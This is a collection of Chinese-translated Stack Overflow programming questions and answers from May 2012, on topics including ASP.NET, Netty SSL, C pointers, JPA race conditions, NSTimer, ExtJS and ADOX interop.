# asp.net - 在 Asp.Net 中从 GridView 控件生成压缩的 HTML

> ID：10597661
> 
> 赞同：0
> 
> 时间：2012-05-15T09:17:57.800
> 
> 标签：asp.net

有没有可能从 GridVIew 生成压缩的 HTML ？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:31:05.390

我不建议这样做，但我可以给出我将如何尝试这样做的想法：您可以在字符串中呈现 GridView，进行压缩，然后将其显示到页面上。

```
TextWriter stringWriter = new StringWriter();

    HtmlTextWriter GrapseMesaMou = new HtmlTextWriter(stringWriter);

    cGridView.RenderControl(GrapseMesaMou);

    // this is the string that you show on page (eg place it on a literal)
    string cFinalResults = CompressHtml(stringWriter.ToString());

    // not show it any more...
    cGridView.Visible = false; 
```

一个 html 压缩器：[http ://code.google.com/p/htmlcompressor/](http://code.google.com/p/htmlcompressor/)

我不知道这是否适用于所有情况，但你可以试一试，看看它是否是你想要的。

# java - Netty 中的两种 SSL 身份验证

> ID：10597663
> 
> 赞同：3
> 
> 时间：2012-05-15T09:18:06.603
> 
> 标签：java, ssl, netty

我正在开发一个基于服务器和客户端的应用程序，它需要两种方式的 SSL 身份验证。（客户端验证服务器和服务器验证客户端都使用 SSL 证书。）

我对 Netty 很陌生，对此几乎没有疑问。

1.  使用 Netty 可以进行两种身份验证吗？
2.  通过向服务器和客户端的 pipelinefactories 添加另一个 SslHandler 可以简单地实现吗？
3.  如果上述情况属实，如何在 ChannelConnected() 方法中获取所需的 SslHandler 来执行 SslHandshake？是否可以通过再次调用管道来调用 ChannelConected() 方法的第二次握手？
4.  有什么我可以参考的例子吗？

我非常感谢有关此问题的任何帮助，答案或朝着正确方向的推动。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-16T00:46:42.833

**使用 Netty 可以进行两种身份验证吗？**

是的

**通过向服务器和客户端的 pipelinefactories 添加另一个 SslHandler 可以简单地实现吗？**

是的

**如果上述情况属实，如何在 ChannelConnected() 方法中获取所需的 SslHandler 来执行 SslHandshake？**

创建`SSLContext`.

**是否可以通过再次调用管道来调用 ChannelConected() 方法的第二次握手？**

从内存中，客户端和服务器身份验证在第一次握手中完成。

在客户端上，将客户端的私钥安装在密钥库中，将服务器的公钥安装在信任库中。

在服务器上，将服务器的私钥安装在密钥库中，将客户端的公钥安装在信任库中。

**有什么我可以参考的例子吗？**

*   这是我为 websockets 做的一个[例子。](https://github.com/netty/netty/blob/master/example/src/main/java/io/netty/example/http/websocketx/sslserver/WebSocketSslServerSslContext.java)它仅向您展示如何设置服务器密钥库。您必须添加一个信任库作为第二个参数`serverContext.init(kmf.getKeyManagers(), null, null);`

*   这是 Scala 中使用信任存储设置的类似[示例](https://github.com/mashupbots/socko/blob/master/socko-webserver/src/main/scala/org/mashupbots/socko/webserver/SslManager.scala)。

*   这是关于如何设置 SSLContext的一个很好的[java 指南。](http://download.oracle.com/javase/6/docs/technotes/guides/security/jsse/JSSERefGuide.html)

希望这可以帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T10:17:19.467

双向身份验证要求服务器和客户端都具有对方信任的证书。客户端需要生成一个私钥，将其存储在他的密钥库中，并由服务器信任库信任的人对其进行签名。

这不仅仅是你编写什么代码的问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T10:27:12.987

SSL 是一种表示层协议，SSL 握手发生在套接字连接建立之后和应用层获得可用套接字连接之前。无论您使用什么应用程序，如果您有 SSL 协议层，那么您就可以在 SSL 上工作。

双向身份验证只是上面@EJP 提到的配置问题。如果双方可以建立并验证彼此的信任链，则握手成功。有关配置 SSL 信任库的信息，请参阅 netty 配置手册。

# c - 通过引用函数传递结构后访问结构指针

> ID：10597664
> 
> 赞同：0
> 
> 时间：2012-05-15T09:18:08.190
> 
> 标签：c, pointers, struct, pass-by-reference

我有这段代码，但是我不确定在通过引用将结构传递给函数后如何访问结构指针，程序在这一行崩溃，访问指针不起作用。

```
 scanf("(%lf,%lf)",polygon->xvals[i],polygon->yvals[i]); 
```

固定代码，感谢所有回答的人

```
 struct Polygon{
    double *xvals, *yvals;
    int numverts;
    };
    typedef struct Polygon pol;
    pol getpoly(pol *polygon);

    int main(){
     pol polygon;
     getpoly(&polygon);  
            }

    pol getpoly(pol *polygon){
      polygon->xvals = (double * )malloc(sizeof(double)*polygon->numverts);
      polygon->yvals = (double * )malloc(sizeof(double)*polygon->numverts); 

      check=0;
      int i;

      for(i=0;i<10;i++){

       while(check !=2 ){
        cout<<"enter vertices "<<i<<" (x,y)\n";
        check = scanf("(%lf,%lf)",&polygon->xvals[i],&polygon->yvals[i]);
        _flushall();
       }
      check=0; 
      }
      polygon->xvals[polygon->numverts-1] = polygon->xvals[0];
      polygon->yvals[polygon->numverts-1] = polygon->yvals[0]; 

    return *polygon;    
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:25:05.887

没有为`xvals`和分配内存`yvals`，它们是未初始化的指针。`numverts`也是未初始化的。您需要留出`malloc()`空间`xvals`并`yvals`初始化`numverts`：

```
polygon->numverts = 10;
polygon->xvals = malloc(polygon->numverts * sizeof(double));
polygon->yvals = malloc(polygon->numverts * sizeof(double)); 
```

并防止超出这些数组的末尾，就像这段代码一样：

```
polygon->xvals[polygon->numverts] = polygon->xvals[0];
polygon->yvals[polygon->numverts] = polygon->yvals[0]; 
```

应该：

```
polygon->xvals[polygon->numverts - 1] = polygon->xvals[0];
polygon->yvals[polygon->numverts - 1] = polygon->yvals[0]; 
```

请记住`free()` `xvals`，`yvals`何时不再需要。

# macos - XPC 导致出现崩溃对话框

> ID：10597666
> 
> 赞同：1
> 
> 时间：2012-05-15T09:18:15.740
> 
> 标签：macos, cocoa, xpc

我实施了 XPC，因为 Apple 建议将其用于高风险操作。问题是当 XPC 崩溃时，它会向用户显示崩溃对话框。我知道这段代码有时会崩溃，这就是我首先实现 XPC 的原因。那么有什么办法可以抑制崩溃报告吗？

如果您需要任何详细信息，请添加评论，我会尽快更新线程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T12:52:43.697

我在这里找到了答案：http: [//lists.apple.com/archives/cocoa-dev/2009/Sep/msg01658.html](http://lists.apple.com/archives/cocoa-dev/2009/Sep/msg01658.html)

这可能会解决您的问题，但可能会导致其他问题：我不确定沙盒应用程序中是否仍然允许这样做......

尽管如此，正确的做法是修复崩溃 :)

# c# - 以编程方式使用 LowProfileImageLoader

> ID：10597668
> 
> 赞同：2
> 
> 时间：2012-05-15T09:18:22.007
> 
> 标签：c#, silverlight, windows-phone-7

我正在尝试按照 David Anson 博客上使用 LowProfileImageLoader 的使用说明在后台线程上下载远程图像：

[http://blogs.msdn.com/b/delay/archive/2010/09/02/keep-a-low-profile-lowprofileimageloader-helps-the-windows-phone-7-ui-thread-stay-responsive-通过在背景中加载图像.aspx](http://blogs.msdn.com/b/delay/archive/2010/09/02/keep-a-low-profile-lowprofileimageloader-helps-the-windows-phone-7-ui-thread-stay-responsive-by-loading-images-in-the-background.aspx)

我遇到的问题是，我不想在设计时在 xaml 中使用，而是想在代码隐藏中使用它。我可以获得对延迟命名空间的引用，但不知道如何做相当于

```
<Image
    delay:LowProfileImageLoader.UriSource="{Binding ProfileImageUrl}"
    Width="24"
    Height="24"/> 
```

在 C# 中。

欢迎大家帮忙。

干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-16T12:32:00.127

这`LowProfileImageLoader`是一个附加的行为，带有一个名为 的附加属性`UriSourceProperty`。

因此，您只需绑定附加属性的值，就像您对任何其他属性所做的那样，使用`SetBinding`.

```
Image img = new BitmapImage();
img.SetBinding(Delay.LowProfileImageLoader.UriSourceProperty, new Binding("ProfileImageUrl"));
img.Width = 24;
img.Height = 24; 
```

# stored-procedures - 如何从 Windows 脚本文件执行 oracle 存储过程？

> ID：10597676
> 
> 赞同：0
> 
> 时间：2012-05-15T09:18:36.630
> 
> 标签：stored-procedures, sqlplus, wsh, jscript

需要一点帮助：

```
var oShell_1 = WScript.CreateObject ("WScript.Shell");
    oShell_1.run ("cmd /c CD C:\\ && sqlplus.exe user/pass@DATABASE && execute proc() /c;", 2 /* SW_SHOWNORMAL */, true /* bWaitOnReturn */); 
```

不起作用=（。我也希望窗口保持打开状态。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T20:02:56.733

也许是因为这种情况：`oShell_1.run(...)`应该是`oShell_1.Run(...)`. `2`由于“intWindowStyle”显示窗口最小化，通常`1`在启动应用程序时使用。

我也认为论点中的评论可能是非法的。

# python - Python连接字符串 - UnicodeDecodeError：'ascii'编解码器无法解码字节

> ID：10597677
> 
> 赞同：2
> 
> 时间：2012-05-15T09:18:37.737
> 
> 标签：python, string, utf-8, ascii

我想像这样连接两个字符串：

```
requestData = command + ' ' + data 
```

在我的情况下，“数据”包含不应打开的二进制数据 - 它应该只是将其粘合到命令上。但恕我直言python正在尝试打开它，但它失败了：

```
UnicodeDecodeError: 'ascii' codec can't decode byte 0xbc in position 1: ordinal not in range(128) 
```

有没有不开胶的方法？

编辑：Python 2.7 我的数据实际上不是 utf-8 解码可能无济于事 - 它的二进制数据。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:26:20.130

尝试使用[http://docs.python.org/library/array.html](http://docs.python.org/library/array.html)（带有'B'）而不是字符串

# api - 澳大利亚郊区的谷歌地图阴影

> ID：10597683
> 
> 赞同：5
> 
> 时间：2012-05-15T09:18:41.777
> 
> 标签：api, google-maps, geocoding

我需要一种方法，根据我的输入为澳大利亚郊区涂上不同的颜色。不确定如何使用 Google Maps API 执行此操作。谷歌地图有澳大利亚郊区的边界，我想告诉谷歌地图根据我的指示为每个郊区涂上不同的颜色。我对如何做到这一点非常开放。

我的目标是拥有一个交互式的谷歌地图，其中有不同颜色的郊区。您可以缩小并查看整个区域，看看是否有共同的郊区或不同颜色的郊区。关键将基于房价中位数、房屋销售量、人口统计等因素。

原因：这样做有 3 个原因。

1.  在 PowerPoint 报告中放置屏幕截图
2.  向客户发送链接，并向他们展示他们的区域，其中包含不同的编码信息
3.  将来构建一个系统，从数据库中提取并生成它作为门户网站的一部分

如何：我有一个电子表格，其中包含以下信息：Cherrybrook、Red、Castle Hill、Blue、Kellyville、Pink（或 HTML 颜色或数字——可以生成所需的任何格式）。

如果可能的话，我还想根据郊区的颜色来标记郊区（这可能是谷歌地球的一项功能）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T14:58:16.940

您也许可以使用 Polygon 类，但一次可以显示多少个多边形存在性能限制。如果您一次只显示一个都市区，您可能会没事。

更有可能的是，您会想要创建图块。有关图块的文档，请参阅 [https://developers.google.com/maps/documentation/javascript/overlays](https://developers.google.com/maps/documentation/javascript/overlays) 。

这是非常强大的。例如，您可以看到我和朋友创建的一个网站，该网站使用图块按人口普查区显示澳大利亚 2006 年人口普查数据：http: [//sunburntpeople.com/census/](http://sunburntpeople.com/census/)

# javascript - history.forward() 不影响浏览器

> ID：10597684
> 
> 赞同：2
> 
> 时间：2012-05-15T09:18:46.760
> 
> 标签：javascript, browser

我在jsp页面的body标签中写了：

```
onload = "history.forward()" 
```

此代码在我的浏览器（Internet Explorer）中受到影响，但在浏览器的更新版本和某些 Internet Explorer 中不受影响。我还在 Mozilla 中检查了“启用 javascript”，例如：

```
Tools ---> Options ---> Content tab --->  Enable Javascript 
```

但这不行。我想知道这个问题是因为浏览器版本还是浏览器设置。我将如何受到以下代码的影响：

```
onload = "history.forward()" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:22:17.453

你应该试试：

```
window.history.forward(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T10:14:39.153

```
<html>
<head>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2   /jquery.min.js"></script>
<script>
$(document).ready(function(){
    window.history.forward();
});
</script>
</head>
</html> 
```

使用此方法。它正在工作，但它使用了 jQuery。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-16T09:29:16.337

试试这个代码

```
<body onload="onLoad();" onpageshow="if (event.persisted) onLoad();"> 
```

因为 Firefox 为单个浏览器会话使用整个网页的内存缓存，包括它们的 JavaScript 状态。在访问的页面之间来回移动不需要加载页面，并且保留 JavaScript 状态。

[单击此处供您参考](https://developer.mozilla.org/en/Using_Firefox_1.5_caching)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T09:23:04.773

试试`history.go(1)`，这应该可以。或者`window.history.go(1)`

# android - 操纵数据库操作和字典概念

> ID：10597686
> 
> 赞同：0
> 
> 时间：2012-05-15T09:18:48.517
> 
> 标签：android, dictionary

我是 Android 应用程序开发的新手。现在我正在编写一个用于操作数据库操作的单例类。在选择查询的情况下，我打算将“表字段名称”存储为字典中每一行的键和数据。然后将每个行数据字典存储在一个数组中。我已经在 iOS 中实现了这个概念。但由于我是 Android 新手，我不知道如何在 Android 中实现字典概念。这在Android中可用吗？如果是这样，任何人都可以帮助我实施。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:25:13.910

在 ios 中可能`dictionary`是将数据保存为键/对值

在android中我们有`HashMap<Key,Value>`

```
Map<Intger,String> map = new HashMap<Integer,String>(); 
```

这里`Integer is key and String is value`

**//在地图中添加数据**

```
map.put(1,"string1");
map.put(2,"string2"); 
```

**笔记 ：：**

注意`key is unique not allowed duplicates`和`if you need ordered data then use LinkedHashmap instead of Hashmap`

**//获取数据**

```
for(Map.Entry<Integer,String> entry :map.entrySet())
{
    int i = entry.getKey();
    String s = entry.getValue();
} 
```

# ravendb - RavenDB 中的索引和关系数据库索引的工作方式相同吗？

> ID：10597689
> 
> 赞同：2
> 
> 时间：2012-05-15T09:18:53.067
> 
> 标签：ravendb

我对 RavenDB 很陌生，我正在尝试了解索引在 RavenDB 中的工作原理。[我从这个“数据库索引如何工作？](https://stackoverflow.com/questions/1108/how-does-database-indexing-work) ”中找到了关于关系数据库索引的一个很好的解释。但我想知道 RavenDB 中的索引是否与关系数据库的索引相同？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:58:04.853

Kekewong，不，他们的工作方式截然不同。它们是在后台构建的，提供全文搜索支持，并且使用与大多数数据库索引不同的格式存储。

# database-design - 将三元关系分解为二元关系

> ID：10597698
> 
> 赞同：9
> 
> 时间：2012-05-15T09:19:11.387
> 
> 标签：database-design, entity-relationship

我正在设计一个数据库来处理具有以下关系和约束的用户、帐户和项目：

*   一个帐户有很多用户
*   一个用户属于多个账户
*   一个账户有很多项目
*   **一个项目只**属于一个账户
*   用户在许多项目中进行协作（冗余说明：每个项目都属于自己的帐户）。

换句话说，一个用户可以在同一个帐户的多个项目中进行协作。但是由于一个用户可以属于多个账户，因此一个用户可以在多个账户的多个项目中进行协作。这使我建立了三元*合作*关系：

![在此处输入图像描述](../Images/676d07b19cee09c84ba0b57842edc264.png)

在阅读了几篇关于将三元关系转换为二元关系的论文后，我提出了以下等价关系：

![在此处输入图像描述](../Images/3abbe6890d49c98c38d3127a247c12be.png)

这里出现两个问题：

1.  这种转换正确吗？我发现我必须在应用程序级别添加额外的检查来处理插入。例如，在添加新用户之前，`(User,Project)`我必须检查用户是否属于项目所属的同一帐户。

2.  真的有必要建立 和 之间的关系`Account`吗`User`？`User`加上和之间的关系`Project`后，我们不能通过访问项目知道用户所属的帐户吗？

谢谢！！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-15T11:48:44.633

> 这种转换正确吗？

如果“正确”的意思是“等效”，那么不是。

*在不*连接用户（等等）的情况下，没有什么可以阻止您连接项目和帐户，这在真正的三元关系中是不可能的。

> 真的有必要建立Account和User之间的关系吗？...我们不能通过访问项目知道用户所属的帐户吗？

实际上，我们只知道哪些帐户是连接到用户的“候选”，但我们没有好办法选择一个。

这个方案的真正问题是它允许您将用户连接到与用户的任何项目无关的帐户。

* * *

在我看来，如果你需要三元关系，直接在物理模型中表示即可。如果我正确理解您的要求，这将如下所示：

![在此处输入图像描述](../Images/f9791fa4146084cf176ebff76c8900b3.png)

注意PK`AccountId`之外的情况。`Collaboration`这意味着每个项目/用户组合都必须连接到一个帐户（*不同*的组合仍然可以连接到不同的帐户）。

# protocol-buffers - 数据库访问系统技术

> ID：10597707
> 
> 赞同：1
> 
> 时间：2012-05-15T09:19:36.193
> 
> 标签：protocol-buffers, thrift, ice

我目前正在设计应该允许访问数据库的系统。假设如下：

*   数据库应该有访问层。访问层应该提供代表数据库表的对象。（这将使用一些 ORM 框架来完成）。
*   想要从数据库中获取数据的客户端，应该首先从访问层获取对象，然后使用这些对象获取数据。
*   客户端可以使用 Python、Java 或 C++。
*   访问层基于Java。
*   不会有很多客户，但他们会处理大量数据。

对我来说很难的问题是应该使用什么技术在访问层和客户端之间传递对象。我考虑使用 ZeroC ICE、Apache Thrift 或 Google Protocol Buffers。有没有人有意见哪个值得使用？

这是我对**协议缓冲区**的研究：

优点：

*   使用简单，易于上手
*   有据可查
*   高度优化
*   用类java语言定义对象数据结构
*   自动生成 setter 和 getter 的实现以及 Python、Java 和 C++ 的构建方法
*   其他语言的开源投标
*   可以扩展对象而不影响旧版本的应用程序
*   有很多开源的 RpcChanel 和 RpcController 实现（未测试）

缺点：

*   需要实现对象传输
*   对象结构必须在使用前定义，~~所以我们不能即时添加一些字段~~（更新：有这样做的可能性，请参阅评论）
*   如果需要读取一个对象的文件，我们必须解析整个文件（相反，在 XML 中我们可以忽略选择的标签）
*   如果我们想使用 RPC 来调用对象方法，我们需要定义服务并交付 RpcChanel 和 RpcController 实现

这是我对**Apache Thrift**的研究：

优点：

*   提供为支持的语言（类，所有重要的东西）生成源代码的编译器
*   允许在结构中定义可选字段（当我们不对字段设置值时，传输数据的大小较小）
*   enable 指出一些“单向”的方法（调用后什么都不返回，客户端不等待服务器关于查询完成处理的回答）
*   支持集合（映射、列表、集合）、对象、原语序列化（反序列化）、常量、枚举、异常
*   大多数问题，错误都得到解决和解释
*   提供不同的序列化方法：（TBinaryProtocol...）和不同的数据交换方式：（TBufferedTransport, TZlibTransport...）
*   编译器为我们可以通过添加一些新方法扩展的语言生成类（结构）。
*   可以向协议（服务器和客户端）添加字段并删除其他旧代码和新代码可以正确交互（更新中的一些规则）
*   启用异步调用
*   便于使用

缺点：

*   文档 - 包含一些错误，有时很难知道问题的根源是什么
*   并非所有问题都被很好地标记（当我们在 Internet 上寻找解决方案时）。
*   不支持服务方法的重载
*   教程仅涵盖节俭使用的简单示例
*   很难开始

**ICE ZeroC：** 比协议缓冲区更好，因为我不需要自己通过套接字实现对象传递。ICE 还提供了可以提供连接管理的 ServantLocators。问题是：ICE 是否比 PB 慢得多且效率低得多？

# magento - Magento 产品集合和按类别分组

> ID：10597712
> 
> 赞同：0
> 
> 时间：2012-05-15T09:19:58.270
> 
> 标签：magento

如何通过在我的集合末尾添加“GROUP BY”类别来创建 Magento 产品集合？

感谢帮助。

**[编辑]：**

我试过这个：

```
$productCollection = Mage::getModel('catalog/product')->getCollection();
->addAttributeToSelect('*')

$productCollection->getSelect()->group(array('name')); 
```

但它不起作用，我已经测试了生成的查询，它在 phpmyadmin 中说：`#1054 - Unknown column 'name' in 'group statement`

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-15T11:27:29.083

从这里开始

[http://www.magentocommerce.com/knowledge-base/entry/magento-for-dev-part-8-varien-data-collections](http://www.magentocommerce.com/knowledge-base/entry/magento-for-dev-part-8-varien-data-collections)

在这里继续

[http://framework.zend.com/manual/en/zend.db.select.html](http://framework.zend.com/manual/en/zend.db.select.html)

利润 $$$$

# java - 使用事务的竞争条件

> ID：10597713
> 
> 赞同：3
> 
> 时间：2012-05-15T09:20:04.970
> 
> 标签：java, hibernate, jpa, transactions, race-condition

我有这个交易：

```
em.getTransaction().begin();
{
    final Payment payment = em.find(Payment.class, id);
    if (payment.status != Status.INIT)
        throw new IllegalStateException("Cannot set to PAID, is not INIT but " + status);

    payment.status = Status.PAID;

}
em.getTransaction().commit();
log.info("Payment " + id + " was paid"); 
```

但是，正如您在此处看到的，事务不会阻止竞争条件：

```
[11:10:18.265] INFO  [PaymentServlet] [MSP] Status COMPLETED 
[11:10:18.265] INFO  [PaymentServlet] Payment c76f9e75-99d7-4721-a8ac-e3a638dd8317 was paid 
[11:10:18.267] INFO  [PaymentServlet] [MSP] Status COMPLETED 
[11:10:18.267] INFO  [PaymentServlet] Payment c76f9e75-99d7-4721-a8ac-e3a638dd8317 was paid 
```

付款设置为`PAID`两次。我的异常没有被抛出，也没有回滚或任何东西。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T09:27:35.300

您需要使用乐观锁定。乐观锁定是冲突更新很少发生的地方，因此可以在偶尔事务发生时回滚它。悲观锁定会导致数据库在对象使用时对其进行锁定，从而有效地单线程处理所有内容并可能导致性能问题。有关更详细的说明，请参阅[http://en.wikibooks.org/wiki/Java_Persistence/Locking#JPA_2.0_Locking 。](http://en.wikibooks.org/wiki/Java_Persistence/Locking#JPA_2.0_Locking)

要解决这里的问题，您应该在 Payment 中添加一个字段（传统声明为 private Long 版本）并为其提供 JPA @Version 注解。如果您手动管理架构，请确保相应的列存在于正确的表中。然后，JPA 将使用此字段来检查冲突更新并在存在冲突时回滚事务。

更新：有关悲观锁定的更多信息：[https](https://blogs.oracle.com/carolmcdonald/entry/jpa_2_0_concurrency_and) ://blogs.oracle.com/carolmcdonald/entry/jpa_2_0_concurrency_and简而言之，您*可以*配置 JPA 来锁定对象，但这样做是个好主意的情况非常罕见。换句话说，如果你手动编写 JDBC 查询，你必须在每次选择的末尾写上“for update”来导致悲观锁定；默认是不锁定读取，因为它会让数据库和数据库用户哭泣。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T12:17:42.340

你没有说你正在使用什么数据库，或者什么事务隔离级别。如果您使用`SERIALIZABLE`符合 SQL 标准的事务，您将不会看到此错误。PostgreSQL 9.1 之前的版本，MS SQL Server 的一些配置，以及所有版本的 Oracle 在你请求的时候都不会给你真正的可序列化事务，所以在这样的环境中必须使用显式锁。大多数数据库产品默认为`READ COMMITTED`事务隔离级别，因此您可能需要显式请求`SERIALIZABLE`事务。

充分披露，我与麻省理工学院的 Dan RK Ports 合作，将真正的可序列化事务添加到 PostgreSQL 版本 9.1，以便 Wisconsin Courts 软件可以干净地处理这些问题。有关差异的示例，请参阅[此 Wiki 页面](http://wiki.postgresql.org/wiki/SSI)。

# ios - 如何每x次自动调用功能

> ID：10597719
> 
> 赞同：11
> 
> 时间：2012-05-15T09:20:31.433
> 
> 标签：ios, xcode, uilabel, nsdata

> **可能重复：**
> [如何在每“X”分钟调用函数？](https://stackoverflow.com/questions/1053585/how-to-call-function-in-every-x-minute)

如何定期调用某个函数？

```
- (void)viewDidLoad
{ 
    [super viewDidLoad];
    [self checkAlert];   
}

-(void)checkAlert{
    // Server output Alert Note
    NSString *alert_note_hostStr = @"http://www.loxleyintranet.com/MobileApplication/xml/alert_note.php";
    NSData *alert_note_dataURL = [NSData dataWithContentsOfURL:[NSURL URLWithString:alert_note_hostStr]];
    NSString *alert_note_serverOutput = [[NSString alloc] initWithData:alert_note_dataURL encoding:NSASCIIStringEncoding];

    if ([alert_note_serverOutput isEqualToString:@"0"]) {
        alertImage.hidden = YES;
        alertLabel.hidden = YES;
        underMainBG.hidden = YES;
        alertLabel.text = [NSString stringWithFormat:@"No Alert"];
    }else{    
        alertLabel.text = [NSString stringWithFormat:@"You've Got Note (%@)" ,alert_note_serverOutput];

    }    
} 
```

我怎样才能`[self checkAlert];`每隔`x`几分钟或几秒钟打电话一次？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-05-15T09:22:16.723

使用`[NSTimer scheduledTimerWithTimeInterval:60.0 target:self selector:@selector(checkAlert) userInfo:nil repeats:YES];`.

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-05-15T09:27:21.603

```
[NSTimer scheduledTimerWithTimeInterval:1 target:self selector:@selector(myTimerTick:) userInfo:nil repeats:YES]; // the interval is in seconds... 
```

...那么你的`myTimerTick:`方法应该是这样的..

```
-(void)myTimerTick:(NSTimer *)timer
{
    if(some_contiditon)
    {
        // Do stuff...
    }
    else
    {
        [timer invalidate]; //to stop and invalidate the timer.
    }
} 
```

# debugging - 为所有页面自动打开 Chrome 网络检查器

> ID：10597720
> 
> 赞同：2
> 
> 时间：2012-05-15T09:20:36.997
> 
> 标签：debugging, google-chrome, google-chrome-devtools, web-inspector

我需要使用网络选项卡跟踪重定向，但它只有在我打开网络检查器然后重新加载页面时才有效。不幸的是，我从外部本机程序打开此页面并需要找到传递给浏览器的 URL。是否有可能做到这一点？我需要在 Windows 7 上执行此操作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T10:17:06.490

据我所知，这是不可能的。最新的 chromium 命令行开关的完整列表可以在这里找到：http: [//peter.sh/experiments/chromium-command-line-switches/](http://peter.sh/experiments/chromium-command-line-switches/)

我认为您可以使用 来获得一些工作`--wait-for-debugger-children`，让您有足够的时间在页面加载之前打开开发人员工具，但设置该标志也会让开发人员工具在加载前延迟 1 分钟。

# javascript - ExtJS 4设置视口的加载掩码

> ID：10597722
> 
> 赞同：2
> 
> 时间：2012-05-15T09:20:40.810
> 
> 标签：javascript, extjs

我正在尝试为我的视口设置一个加载蒙版，因为加载它需要很多时间。我试过这个：

```
Ext.define('MY.view.Viewport', {
    extend: 'Ext.Viewport',
    alias: 'widget.dispviewport',

    initComponent: function() {
        var me = this;
        var myMask = new Ext.LoadMask(Ext.getBody(), {msg:"Please wait..."});
//      myMask.show();
        Ext.apply(me, {
            id : 'main-viewport',
            listeners: {
                beforerender: function() {
                    myMask.show();
                },
                afterrender: function() {
                    myMask.destroy();
                }
            },
            renderTo: 'id-sym-container',
            layout: {... 
```

但似乎我从来没有进入过`beforerender`。`console.log`我在函数中尝试过`beforerender`，它也没有出现。当我这样尝试时：

```
Ext.define('MY.view.Viewport', {
    extend: 'Ext.Viewport',
    alias: 'widget.dispviewport',

    initComponent: function() {
        var me = this;
        var myMask = new Ext.LoadMask(Ext.getBody(), {msg:"Please wait..."});
        myMask.show();
        Ext.apply(me, {
            id : 'main-viewport',
            listeners: {
//              beforerender: function() {
//                  myMask.show();
//              },
                afterrender: function() {
                    myMask.destroy();
                }
            }, 
```

它有效，但我的面具显示得太晚了。我是否使用`beforerender`了错误的方式，以及`myMask`在我`Viewport`开始渲染时准确启动的方式是什么？

谢谢

勒隆

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T13:13:41.037

您的代码不是为 设置加载掩码`viewport`，而是为`body`

因此，您可以做的是，一些代码...

```
Ext.create('MY.view.Viewport'); 
```

应该看起来像..

```
 var myMask = new Ext.LoadMask(Ext.getBody(), {msg:"Please wait..."});
 viewport = Ext.create('MY.view.Viewport');
 viewport.on('afterrender',function(){myMask.destroy();},this); 
```

不过评论里的人是对的：P

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-30T15:20:12.377

在 ExtJs 4 中，您可以在视口中声明加载掩码：

```
Ext.define('Tps.view.Viewport', {
    extend: 'Ext.container.Viewport',
    alias: 'widget.viewport',

    initComponent: function () {
        Ext.apply(this, {
            layout: 'fit',
            items: [
                {
                    xtype: 'loadmask',
                    id: 'load-indicator',
                    indicator: true,
                    hidden: true,
                    target: this
                }
            ]
        });
        this.callParent();
    }
}); 
```

请注意，目标配置是视口本身。要显示/隐藏加载掩码，请调用

```
Ext.getCmp('load-indicator').show();
Ext.getCmp('load-indicator').hide(); 
```

在视口的渲染事件中显示加载掩码或将隐藏配置设置为 false。

# c# - 无法将 ADOX.Catalog.ActiveConnection 设置为来自 .NET 的 ADODB 连接

> ID：10597741
> 
> 赞同：4
> 
> 时间：2012-05-15T09:21:41.817
> 
> 标签：c#, vb6, ado, com-interop, adox

我的任务是将遗留的 VB6 应用程序（使用 MS Access 作为数据库，不要问）增量移植到 .NET。

这将是一个很长的文章，但我认为最好提供一些背景信息。

此应用程序有一个带有菜单的主 MDI 表单，该菜单是根据应用程序文件夹中的 DLL 动态创建的。它本质上是一种插件：每个 DLL 都由一个菜单项表示，当单击该菜单项时，将打开 DLL 中包含的主窗体，并`SetParent()`根据需要进行调用。

MDI 表格是我的起点。我想重写足够多的内容（当然，我要进行重新设计和单元测试）以便能够打开所述表单。一旦我确定了那个，我将开始一次重写一个 DLL。

每个 DLL 都需要一个 ADO 连接，我已经能够从 C# 传递它。

问题是，其中一个插件（至少，但可能还有许多其他插件）使用 ADOX 在数据库上做事，问题就在这里：当我尝试将 ADOX.Catalog 的 ActiveConnection 属性设置为 ADO 连接时，所有我得到的是运行时错误 3001：`Arguments are of the wrong type, are out of acceptable range, or are in conflict with one another.`

我一生都无法弄清楚我做错了什么。

VB6 代码尽可能简单：

```
Dim c As New ADOX.Catalog
Set c.ActiveConnection = theAdoConnectionComingFromDotNet   ' error! 
```

创建 ADO 连接的 C# 代码与 VB 代码一样简单：

```
var conn = new ADODB.Connection();
conn.Open("Provider=Microsoft.JET.Oledb;[...]"); 
```

并且调用`Open()`成功。如果我尝试`ActiveConnection`在 C# 端设置 ，如下所示：

```
var catalog = new ADOX.Catalog();
catalog.ActiveConnection = conn; 
```

一切正常。

现在，我可以通过简单地在 C# 端实例化 ADOX 并将其传递给 VB6 来解决这个问题，但是调整 VB6 代码（当然没有单个单元测试）可以证明是一个 PITA，我不是甚至确保一开始这很容易（因为该应用程序可以一次使用多个 Access DB，并根据需要打开和关闭与每个数据库的连接）。

